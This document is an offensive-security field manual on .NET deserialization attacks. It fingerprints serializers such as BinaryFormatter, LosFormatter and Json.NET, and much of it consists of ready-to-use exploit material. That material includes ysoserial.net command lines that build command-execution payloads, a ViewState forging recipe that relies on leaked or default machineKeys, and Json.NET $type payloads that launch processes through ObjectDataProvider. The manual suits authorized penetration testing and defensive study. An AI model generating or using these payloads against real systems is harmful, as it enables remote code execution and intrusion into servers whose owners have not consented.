# .NET Deserialization — the full field manual

## The format zoo — .NET has five serializers, not one

| Serializer | Container | Marker |
|---|---|---|
| BinaryFormatter | binary | `00 01 00 00 00 FF FF FF FF` / `AAEAAAD/////` |
| SoapFormatter | SOAP XML | `<SOAP-ENV:Envelope>` + typed nodes |
| LosFormatter | base64 blob | ViewState, `__VIEWSTATE` `/wEP` |
| ObjectStateFormatter | base64 | custom session |
| XmlSerializer | XML | type-named root element |
| NetDataContractSerializer | XML/binary | `z:Assembly`/`z:Type` attrs |
| JavaScriptSerializer | JSON | `__type` field |
| Json.NET | JSON | `$type` field |

Each is its own bug — `TypeNameHandling` on Json.NET is nothing like
`BinaryFormatter`. Fingerprint the container first.

## What fires — the gadget hooks

- `BinaryFormatter`/`SoapFormatter`/`NetDataContractSerializer` call
  `ISerializable.GetObjectData` *backwards* — actually they call the
  deserialization **constructor** `ctor(SerializationInfo,StreamingContext)`
  plus `IDeserializationCallback.OnDeserialization`, `OnDeserialized`,
  `OnDeserializing`. Any of those is a hook.
- `XmlSerializer` calls setters + a parameterless ctor — no method-callback,
  weaker gadget surface.
- `Json.NET` `TypeNameHandling` instantiates `$type` classes — setters,
  `ISerializable` ctor, callbacks all live.

## The fingerprint table (cookie/body → serializer)

```
__VIEWSTATE=/wEPDwUK...       → LosFormatter (ViewState) — MAC'd
AAEAAAD/////                  → BinaryFormatter
{"$type":"System..."}         → Json.NET with TypeNameHandling
{"__type":"System..."}        → JavaScriptSerializer SimpleTypeResolver
<SOAP-ENV:Envelope...SOAP...>  → SoapFormatter
binary 00 01 00 00 00 FF...   → BinaryFormatter raw
```

## ysoserial.net — the generator

```bash
ysoserial.exe -l                          # gadget catalog + the formatters each supports
ysoserial.exe -g <Gadget> -f <Formatter> -c "<cmd>" -o base64

# BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "cmd /c id" -o base64
ysoserial.exe -g ActivitySurrogateSelectorFromFile -f BinaryFormatter -c "cmd /c id"
ysoserial.exe -g WindowsIdentity -f BinaryFormatter -c "cmd /c id" -t
                                          # -t = test mode (local run)

# Json.NET
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "cmd /c id" -o base64
ysoserial.exe -g WindowsClaimsIdentity -f Json.Net -c "cmd /c id"

# SoapFormatter / NetDataContractSerializer / LosFormatter / Xaml
ysoserial.exe -g ActivitySurrogateSelector -f SoapFormatter -c "cmd /c id"
ysoserial.exe -g TextFormattingRunProperties -f LosFormatter -c "cmd /c id"
```

### The gadget table (ysoserial.net names)

| Gadget | Formatter it works on | Impact |
|---|---|---|
| ActivitySurrogateSelector* | most | RCE via compile-to-assembly |
| TypeConfuseDelegate(+Mono) | BinaryFormatter, LosFormatter | RCE |
| WindowsIdentity | BinaryFormatter | RCE via claims → process |
| ObjectDataProvider | Json.NET, Xaml, DataContractSerializer | invoke named method |
| TextFormattingRunProperties | BinaryFormatter, LosFormatter, SoapFormatter | RCE via XAML |
| WindowsClaimsIdentity | Json.NET, BinaryFormatter | RCE |
| ClaimsPrincipal | BinaryFormatter | RCE |
| PSObject | Json.Net | PowerShell |
| RolePrincipal, ClaimsIdentity, SessionSecurityToken | BinaryFormatter | variants |
| ToolboxItemContainer, TypeConfuseDelegateMono | BinaryFormatter | Mono-safe variants |
| AxHostState, DataSet, GenericPrincipal | BinaryFormatter | variants |
| ResourceSet, RegistrationTrigger | misc | variants |
| TransactionCEO | BinaryFormatter | newer |

Rule: `-f` chooses the container the *sink* uses; `-g` chooses the gadget that
survives it. Not every gadget works on every formatter — `-l` prints the matrix.

## ViewState — LosFormatter + machineKey

`__VIEWSTATE` is `LosFormatter`-serialized then **MAC'd** (SHA1/HMACSHA256)
or encrypted — the attack is a key-attack first, grammar second.

```
/wEPDwU...   → LosFormatter stream
__VIEWSTATEGENERATOR=<hex>   → needed to re-encrypt/sign
__EVENTVALIDATION            → sibling MAC'd field
```

### The exploit recipe

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  --validationalg="SHA1" \
  --validationkey="<hex machineKey validationKey>" \
  --decryptionalg="AES" --decryptionkey="<hex machineKey decryptionKey>" \
  --generator="<__VIEWSTATEGENERATOR value>" \
  --path="/vuln.aspx" --apppath="/" \
  -c "cmd /c whoami"
```

### Where the machineKey comes from

- `web.config` in source/leak → literal `validationKey`/`decryptionKey`
- error page that dumps config
- a *default* `machineKey` — `Blacklist3r`/`viewstate-decoder` lists of known
  IIS default keys
- `<machineKey validationKey="AutoGenerate">` on a NON-web-farm host = the key
  is per-app-pool, sometimes recoverable via another primitive
- `machineKey` reuse across apps on the same server (a weaker app leaks the key)

### The MAC-off case

`<pages enableViewStateMac="false">` or `viewStateEncryptionMode="Never"` on
old ASP.NET → the blob is just LosFormatter. Deserialize-craft directly, no key.

## Json.NET `TypeNameHandling` — the JSON-body case

```json
{
  "$type": "System.Diagnostics.Process, System",
  "StartInfo": {"FileName": "cmd", "Arguments": "/c id"}
}
```

Fires only when the server sets `TypeNameHandling = Auto|All|Objects|Arrays`
(NOT `None`). Detection: send a bogus `$type` — a JsonException naming your
type string proves `TypeNameHandling` is on.

```json
// the ObjectDataProvider path — instantiates ANY class + calls a method
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework",
 "MethodName":"Start",
 "MethodParameters":{"$type":"System.Collections.ArrayList","$values":["cmd","/c calc"]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System"}}
```

## XMLDecoder-style sinks + `XmlSerializer`

`XmlSerializer` only instantiates the declared type — the gadget is in a
*known* type's setter chain, weaker. `XMLSerializer` itself rarely yields
RCE; prefer SoapFormatter/NetDataContractSerializer gadgets when the sink
accepts them.

## The `ObjectStateFormatter` path

ASP.NET session state serialized out-of-proc → `ObjectStateFormatter`.
If the app lets you drop a value into session then read it through a state
server, the gadget surface is BinaryFormatter's.

## Second-order .NET sinks

- **Session state server / SQL session state** — write a poisoned session value
- **Out-of-proc cache** (AppFabric/Memcached wrapper storing typed objects)
- **Service broker / MSMQ message** — BinaryFormatter message body
- **ViewState stored server-side then replayed**

## Falsifiers

- `TypeNameHandling.None` + no `ISerializable` sink → Json.NET dead.
- ViewState with a per-request `ViewStateUserKey` bound to an attacker-unknown
  session → can't mint.
- `BinaryFormatter` replaced by `System.Text.Json` (which ignores `$type`)
  or a `SerializationBinder` whitelist.
- Blob is signed/encrypted with an unleaked key → key-attack, not grammar.

## Output to record

- Which serializer the blob is (the fingerprint that decided it)
- gadget name + formatter + the command form
- the machineKey source if ViewState (how the key was obtained)
- verbatim response / OOB line proving the gadget ran
